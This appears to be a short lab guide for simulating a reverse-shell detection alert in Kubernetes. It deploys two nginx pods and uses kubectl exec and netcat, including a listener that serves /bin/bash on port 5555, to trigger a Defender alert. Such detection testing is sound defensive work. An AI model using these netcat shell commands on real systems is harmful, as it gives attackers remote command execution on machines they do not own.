# Detection of a potential reverse shell

Analysis of processes running within a container or directly on a Kubernetes node, has detected a potential reverse shell. These are used to get a compromised machine to call back into a machine an attacker owns

This is categorized as a Medium severy alert

This alert maps to Exfiltration and Explotation with MITRE ATT&CK® tactics

Create a deployment definition file as this

we will use 2 pods, one as the server listening for incoming connections and another as the client which will issue reverse shell commands

```
apiVersion: apps/v1
kind: Deployment
metadata:
  name: nginx-deployment
  labels:
    app: nginx
spec:
  replicas: 2
  selector:
    matchLabels:
      app: nginx
  template:
    metadata:
      labels:
        app: nginx
    spec:
      containers:
      - name: nginx
        image: nginx:1.14.2
```
Now we need to find the ip address of the 2 new deployed pods
```
kubectl get pods -o wide
```

Enter into one of the pods used as the server
```
kubectl exec -it <name-of-serverpod> -- /bin/bash
```
and issue netcat to listen to incoming connections of a port of choice
```
nc -n -v -l -p 5555 -e /bin/bash
```
Enter into the client pod and issue the netcat command
```
nc <ipaddress-of-serverpod> 5555

and wait for the Defender alert to appear

![reverse-shell](/images/reverse-shell.png)